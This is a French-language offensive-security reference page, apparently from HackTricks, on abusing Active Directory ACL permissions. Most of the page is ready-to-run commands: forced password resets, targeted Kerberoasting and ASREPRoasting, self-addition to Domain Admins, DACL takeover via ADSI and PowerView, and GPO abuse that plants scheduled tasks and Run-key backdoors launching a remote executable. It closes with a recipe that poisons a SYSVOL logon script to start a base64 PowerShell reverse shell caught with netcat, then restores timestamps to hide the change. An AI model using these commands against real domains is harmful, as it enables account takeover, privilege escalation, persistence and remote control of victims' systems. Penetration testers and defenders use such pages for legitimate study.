# Abuser les ACLs/ACEs d'Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Cette page est principalement un résumé des techniques de** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **et** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Pour plus de détails, consultez les articles originaux.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

Ce privilège donne à un attaquant le contrôle total d'un compte utilisateur cible. Une fois les droits `GenericAll` confirmés en utilisant la commande `Get-ObjectAcl`, un attaquant peut :

- **Modifier le mot de passe de la cible** : en utilisant `net user <username> <password> /domain`, l'attaquant peut réinitialiser le mot de passe de l'utilisateur.
- Depuis Linux, vous pouvez faire la même chose via SAMR avec Samba `net rpc`:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Si le compte est désactivé, supprimez le flag UAC**: `GenericAll` permet de modifier `userAccountControl`. Depuis Linux, BloodyAD peut supprimer le flag `ACCOUNTDISABLE`:
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Assignez un SPN au compte de l'utilisateur pour le rendre kerberoastable, puis utilisez Rubeus et targetedKerberoast.py pour extraire et tenter de crack les hashes du ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Désactiver la pre-authentication pour l'utilisateur, rendant son compte vulnérable à ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Avec `GenericAll` sur un utilisateur, vous pouvez ajouter un identifiant basé sur un certificat et vous authentifier en tant que cet utilisateur sans modifier son mot de passe. Voir :

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Droits GenericAll sur un groupe**

Ce privilège permet à un attaquant de modifier les adhésions aux groupes s'il dispose des droits `GenericAll` sur un groupe tel que `Domain Admins`. Après avoir identifié le nom distinctif du groupe avec `Get-NetGroup`, l'attaquant peut :

- **S'ajouter au groupe Domain Admins** : Cela peut être fait via des commandes directes ou en utilisant des modules comme Active Directory ou PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Depuis Linux, vous pouvez aussi utiliser BloodyAD pour vous ajouter à des groupes arbitraires lorsque vous disposez d'un accès GenericAll/Write sur ces groupes. Si le groupe cible est imbriqué dans “Remote Management Users”, vous obtiendrez immédiatement un accès WinRM sur les hôtes qui prennent en compte ce groupe :
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Détenir ces privilèges sur un objet ordinateur ou un compte utilisateur permet :

- **Kerberos Resource-based Constrained Delegation** : Permet de prendre le contrôle d'un objet ordinateur.
- **Shadow Credentials** : Utiliser cette technique pour usurper l'identité d'un ordinateur ou d'un compte utilisateur en exploitant les privilèges pour créer des Shadow Credentials.

## **WriteProperty on Group**

Si un utilisateur dispose des droits `WriteProperty` sur tous les objets d'un groupe spécifique (p.ex. `Domain Admins`), il peut :

- **S'ajouter au groupe Domain Admins** : Réalisable en combinant les commandes `net user` et `Add-NetGroupUser`, cette méthode permet une élévation de privilèges dans le domaine.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Ce privilège permet aux attaquants de s'ajouter à des groupes spécifiques, tels que `Domain Admins`, via des commandes qui manipulent directement l'appartenance aux groupes. L'utilisation de la séquence de commandes suivante permet l'auto-ajout :
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Un privilège similaire, il permet aux attaquants de s'ajouter directement à des groupes en modifiant les propriétés des groupes s'ils disposent du droit `WriteProperty` sur ceux-ci. La confirmation et l'exécution de ce privilège s'effectuent avec :
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Détenir le `ExtendedRight` sur un utilisateur pour `User-Force-Change-Password` permet de réinitialiser le mot de passe sans connaître le mot de passe actuel. La vérification de ce droit et son exploitation peuvent être effectuées via PowerShell ou d'autres outils en ligne de commande, offrant plusieurs méthodes pour réinitialiser le mot de passe d'un utilisateur, y compris des sessions interactives et des one-liners pour les environnements non interactifs. Les commandes vont d'invocations PowerShell simples à l'utilisation de `rpcclient` sur Linux, démontrant la polyvalence des vecteurs d'attaque.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner sur un groupe**

Si un attaquant découvre qu'il dispose des droits `WriteOwner` sur un groupe, il peut en changer le propriétaire pour se l'attribuer. Cela est particulièrement impactant lorsque le groupe en question est `Domain Admins`, car changer le propriétaire permet un contrôle plus large sur les attributs du groupe et sa composition. La procédure consiste à identifier l'objet correct via `Get-ObjectAcl` puis à utiliser `Set-DomainObjectOwner` pour modifier le propriétaire, soit par SID, soit par nom.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite sur l'utilisateur**

Cette permission permet à un attaquant de modifier les propriétés d'un utilisateur. Plus précisément, avec un accès `GenericWrite`, l'attaquant peut changer le chemin du script de connexion d'un utilisateur pour exécuter un script malveillant lors de la connexion de l'utilisateur. Cela s'obtient en utilisant la commande `Set-ADObject` pour mettre à jour la propriété `scriptpath` de l'utilisateur ciblé afin de pointer vers le script de l'attaquant.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Avec ce privilège, les attaquants peuvent manipuler l'appartenance aux groupes, par exemple en s'ajoutant eux‑mêmes ou en ajoutant d'autres utilisateurs à des groupes spécifiques. Ce processus implique la création d'un credential object, son utilisation pour ajouter ou supprimer des utilisateurs d'un groupe, et la vérification des modifications d'appartenance via des commandes PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Depuis Linux, Samba `net` peut ajouter/retirer des membres lorsque vous disposez de `GenericWrite` sur le groupe (utile lorsque PowerShell/RSAT ne sont pas disponibles) :
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Posséder un objet AD et disposer des privilèges `WriteDACL` sur celui-ci permet à un attaquant de se donner les privilèges `GenericAll` sur l'objet. Ceci est réalisé via la manipulation ADSI, permettant un contrôle complet de l'objet et la possibilité de modifier ses appartenances à des groupes. Malgré cela, des limitations existent lorsqu'on tente d'exploiter ces privilèges en utilisant les cmdlets `Set-Acl` / `Get-Acl` du module Active Directory.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner prise de contrôle rapide (PowerView)

Lorsque vous avez `WriteOwner` et `WriteDacl` sur un compte utilisateur ou de service, vous pouvez en prendre le contrôle total et réinitialiser son mot de passe avec PowerView sans connaître l'ancien mot de passe :
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Remarques :
- Vous devrez peut-être d'abord changer le propriétaire pour vous-même si vous n'avez que `WriteOwner` :
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Valider l'accès avec n'importe quel protocole (SMB/LDAP/RDP/WinRM) après la réinitialisation du mot de passe.

## **Réplication sur le domaine (DCSync)**

L'attaque DCSync exploite des permissions de réplication spécifiques sur le domaine pour imiter un contrôleur de domaine et synchroniser des données, y compris les identifiants des utilisateurs. Cette technique puissante nécessite des permissions comme `DS-Replication-Get-Changes`, permettant aux attaquants d'extraire des informations sensibles de l'environnement AD sans accès direct à un contrôleur de domaine. [**En savoir plus sur l'attaque DCSync ici.**](../dcsync.md)

## Délégation de GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Délégation de GPO

L'accès délégué pour gérer les objets de stratégie de groupe (GPOs) peut présenter des risques de sécurité importants. Par exemple, si un utilisateur comme `offense\spotless` se voit déléguer des droits de gestion de GPO, il peut disposer de privilèges tels que **WriteProperty**, **WriteDacl**, et **WriteOwner**. Ces permissions peuvent être abusées à des fins malveillantes, comme l'identifie PowerView : `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Énumérer les permissions GPO

Pour identifier les GPOs mal configurés, les cmdlets de PowerSploit peuvent être chaînées. Cela permet de découvrir les GPOs qu'un utilisateur spécifique peut gérer : `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Ordinateurs avec une politique donnée appliquée** : Il est possible de déterminer à quels ordinateurs une GPO spécifique s'applique, ce qui aide à comprendre l'étendue de l'impact potentiel. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Politiques appliquées à un ordinateur donné** : Pour voir quelles politiques s'appliquent à un ordinateur particulier, on peut utiliser des commandes comme `Get-DomainGPO`.

**OUs avec une politique donnée appliquée** : Identifier les unités d'organisation (OUs) affectées par une politique donnée peut se faire avec `Get-DomainOU`.

Vous pouvez aussi utiliser l'outil [**GPOHound**](https://github.com/cogiceo/GPOHound) pour énumérer les GPOs et y trouver des problèmes.

### Abus de GPO - New-GPOImmediateTask

Des GPOs mal configurées peuvent être exploitées pour exécuter du code, par exemple en créant une tâche planifiée immédiate. Cela peut servir à ajouter un utilisateur au groupe d'administrateurs locaux sur les machines affectées, élevant ainsi significativement les privilèges :
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Le module GroupPolicy, s'il est installé, permet la création et le lien de nouvelles GPOs, ainsi que la définition de préférences telles que des valeurs de registre pour exécuter des backdoors sur les ordinateurs affectés. Cette méthode nécessite que la GPO soit mise à jour et qu'un utilisateur se connecte à l'ordinateur pour l'exécution :
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse offre une méthode pour abuser des GPOs existants en ajoutant des tâches ou en modifiant des paramètres sans avoir besoin de créer de nouveaux GPOs. Cet outil nécessite la modification des GPOs existants ou l'utilisation des outils RSAT pour en créer de nouveaux avant d'appliquer les changements :
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forcer la mise à jour des GPO

Les mises à jour des GPO ont généralement lieu environ toutes les 90 minutes. Pour accélérer ce processus, notamment après avoir appliqué un changement, la commande `gpupdate /force` peut être utilisée sur l'ordinateur cible pour forcer une mise à jour immédiate des stratégies. Cette commande garantit que toutes les modifications des GPO sont appliquées sans attendre le prochain cycle automatique de mise à jour.

### Sous le capot

En inspectant les Scheduled Tasks pour un GPO donné, comme `Misconfigured Policy`, on peut confirmer l'ajout de tâches telles que `evilTask`. Ces tâches sont créées via des scripts ou des outils en ligne de commande visant à modifier le comportement du système ou à escalader les privilèges.

La structure de la tâche, comme montrée dans le fichier de configuration XML généré par `New-GPOImmediateTask`, décrit les spécificités de la tâche planifiée — y compris la commande à exécuter et ses déclencheurs. Ce fichier montre comment les tâches planifiées sont définies et gérées au sein des GPO, fournissant un moyen d'exécuter des commandes ou scripts arbitraires dans le cadre de l'application des stratégies.

### Utilisateurs et groupes

Les GPO permettent aussi de manipuler les appartenances des utilisateurs et des groupes sur les systèmes cibles. En éditant directement les fichiers de stratégie Users and Groups, un attaquant peut ajouter des utilisateurs à des groupes privilégiés, comme le groupe local `administrators`. Cela est possible grâce à la délégation des permissions de gestion des GPO, qui autorise la modification des fichiers de stratégie pour inclure de nouveaux utilisateurs ou changer les appartenances aux groupes.

Le fichier de configuration XML pour Users and Groups décrit comment ces changements sont implémentés. En ajoutant des entrées à ce fichier, des utilisateurs spécifiques peuvent se voir accorder des privilèges élevés sur les systèmes affectés. Cette méthode offre une approche directe d'escalade de privilèges via la manipulation des GPO.

De plus, d'autres méthodes pour exécuter du code ou maintenir la persistance, comme l'utilisation de logon/logoff scripts, la modification de clés de registre pour des autoruns, l'installation de logiciels via des fichiers .msi, ou l'édition de la configuration des services, peuvent également être envisagées. Ces techniques offrent diverses voies pour maintenir l'accès et contrôler les systèmes cibles par l'abus des GPO.

## SYSVOL/NETLOGON Logon Script Poisoning

Writable paths under `\\<dc>\SYSVOL\<domain>\scripts\` or `\\<dc>\NETLOGON\` allow tampering with logon scripts executed at user logon via GPO. This yields code execution in the security context of logging users.

### Localiser les logon scripts
- Inspecter les attributs des utilisateurs pour un logon script configuré :
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Explorer les partages de domaine pour faire remonter des raccourcis ou des références à des scripts :
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Analyser les fichiers `.lnk` pour résoudre les cibles pointant vers SYSVOL/NETLOGON (astuce DFIR utile et pour les attaquants sans accès direct aux GPO):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound affiche l'attribut `logonScript` (scriptPath) sur les nœuds utilisateur lorsqu'il est présent.

### Valider l'accès en écriture (ne faites pas confiance aux listes de partages)
Les outils automatisés peuvent afficher SYSVOL/NETLOGON en lecture seule, mais les NTFS ACLs sous-jacentes peuvent toujours autoriser l'écriture. Testez toujours :
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Si la taille du fichier ou le mtime change, cela signifie que vous avez write. Préservez les originaux avant toute modification.

### Empoisonner un VBScript logon script pour RCE
Ajoutez une commande qui lance un PowerShell reverse shell (générez-la depuis revshells.com) et conservez la logique originale pour éviter de casser la fonction métier :
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Écoutez sur votre hôte et attendez le prochain interactive logon :
```bash
rlwrap -cAr nc -lnvp 443
```
Remarques :
- L'exécution se fait sous le token de l'utilisateur connecté (pas SYSTEM). Le périmètre est le lien GPO (OU, site, domain) appliquant ce script.
- Nettoyer en restaurant le contenu et les horodatages d'origine après utilisation.


## Références

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)

{{#include ../../../banners/hacktricks-training.md}}
